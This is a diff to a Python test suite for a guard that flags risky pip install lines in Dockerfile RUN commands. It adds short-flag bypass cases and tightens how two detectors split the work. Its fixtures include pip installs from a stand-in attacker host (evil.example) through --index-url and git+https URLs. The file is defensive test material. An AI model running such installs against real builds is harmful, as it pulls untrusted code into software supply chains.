@@ -85,6 +85,12 @@ BLIND_SPOTS = (
     (P + "dist/mypkg-1.0-py3-none-any.whl", REASON_NOT_A_SPECIFIER, "r5: relative path with no ./ prefix"),
     (P + "-", REASON_NOT_A_SPECIFIER, "r5: '-' is stdin, and is too short for the short-flag branch"),
     (P + '""', REASON_NOT_A_SPECIFIER, "r5: the empty argument"),
+    # --- round 5, found by attacking the round-5 fix: short forms of dangerous long flags ----------
+    (P + "-f /local/wheels requests", REASON_UNREADABLE_TARGET,
+     "r5: -f is --find-links; the long form is red, the short form was green"),
+    (P + "-i /local/index requests", REASON_UNREADABLE_TARGET,
+     "r5: -i is --index-url; green unless the value happened to contain https://"),
+    (P + "--no-index -f /local/wheels requests", REASON_UNREADABLE_TARGET, "r5: the same behind --no-index"),
     # --- the guard must survive the ways a pip invocation can be spelled ---------------------------
     ("RUN pip3 install -r requirements.txt", REASON_UNREADABLE_TARGET, "spelling: pip3"),
     ("RUN python3 -m pip install -r requirements.txt", REASON_UNREADABLE_TARGET, "spelling: python3 -m pip"),
@@ -108,7 +114,8 @@ ORDINARY = (
     (P + "--prefix=/opt requests", "the same, in --flag=value form"),
     (P + "-q -U requests", "unbundled short flags"),
     (P + "--no-cache-dir --no-deps requests", "known boolean flags"),
-    (P + "--find-links /wheels requests", "a local wheel dir as a flag value"),
+    (P + "--upgrade-strategy eager requests", "a destination flag whose value is a policy word"),
+    (P + "--trusted-host pypi.internal requests", "a network-config flag that names no install source"),
 )
 
 
@@ -142,7 +149,7 @@ def test_every_case_reaches_the_parser():
 
 def test_the_case_tables_are_populated():
     """Vacuity guard. A parametrized test over an empty table passes without running once."""
-    assert len(BLIND_SPOTS) >= 30, len(BLIND_SPOTS)
+    assert len(BLIND_SPOTS) >= 36, len(BLIND_SPOTS)
     assert len(ORDINARY) >= 12, len(ORDINARY)
 
 
@@ -164,14 +171,28 @@ def test_a_run_with_no_pip_install_yields_nothing_to_check():
     assert pip_offenders_in(line) == []
 
 
-def test_the_direct_url_check_still_owns_plain_url_installs():
-    """Division of labour, so neither test is assumed to cover the other's cases. `--index-url` is a
-    known destination-value flag, so this guard deliberately skips its value and returns nothing;
-    `PIP_FROM_NETWORK`, behind `test_nothing_is_pip_installed_from_a_url_or_a_repo`, is what catches it.
+def test_the_two_guards_agree_on_everything_that_names_a_package_source():
+    """Division of labour, pinned, so neither test is assumed to cover the other's cases.
+
+    Until round 5 this was a genuine split: `--index-url`/`--extra-index-url`/`--find-links` were listed as
+    ordinary destination-value flags, so this guard skipped their values and `PIP_FROM_NETWORK` - which
+    names those three as literals - was the only thing catching them. That is exactly how `-f`/`-i`, the
+    short spellings `PIP_FROM_NETWORK` knows nothing about, stayed green. Both guards now catch the whole
+    family in both spellings, and this test fails if either one is quietly narrowed again.
     """
-    line = P + "--index-url https://evil.example/simple requests"
-    assert pip_offenders_in(line) == []
-    assert PIP_FROM_NETWORK.search(line)
+    for line in (
+        P + "--index-url https://evil.example/simple requests",
+        P + "--extra-index-url https://evil.example/simple requests",
+        P + "--find-links /local/wheels requests",
+    ):
+        assert pip_offenders_in(line), f"the indirect guard defers to PIP_FROM_NETWORK on {line!r}"
+        assert PIP_FROM_NETWORK.search(line), f"PIP_FROM_NETWORK no longer names the flag in {line!r}"
+
+    # The short forms: PIP_FROM_NETWORK has never known them, so this guard is the only cover they have.
+    for line in (P + "-f /local/wheels requests", P + "-i /local/index requests"):
+        assert pip_offenders_in(line), f"nothing at all catches {line!r}"
+
+    # A URL in target position, with no flag: PIP_FROM_NETWORK owns it, and this guard backs it up.
     for direct in (P + "https://evil.example/pkg.tar.gz", P + "git+https://evil.example/pkg"):
         assert PIP_FROM_NETWORK.search(direct)
         assert pip_offenders_in(direct), "the indirect guard should back the direct one up, not defer to it"
